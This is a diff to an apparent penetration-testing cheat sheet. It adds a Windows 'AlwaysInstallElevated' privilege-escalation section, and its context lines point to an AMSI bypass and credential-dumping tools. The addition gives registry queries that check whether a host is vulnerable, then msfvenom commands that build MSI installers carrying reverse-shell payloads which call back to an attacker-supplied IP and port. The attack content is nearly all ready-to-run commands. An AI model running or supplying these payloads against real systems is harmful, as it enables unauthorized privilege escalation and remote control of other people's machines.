@@ -150,6 +150,19 @@ If you receive any errors it's possible AMSI is preventing execution. Look into 
 ### [amsi bypass @Thanks to bugbyt3 for the recommendation]
 https://amsi.fail/
 
+### [msi elevated privileges]
+```
+Checking if host is vulnerable
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+Generating an MSI Payload (stageless or non)
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f msi > x.msi
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi > x.msi
+```
+
 ### [Active Directory Enumeration]
 BloodHound Ingestors
 
@@ -906,3 +919,5 @@ https://github.com/Flangvik/SharpCollection
 
 ### [PPL Dump - Credential Dumping]
 https://github.com/itm4n/PPLdump
+
+
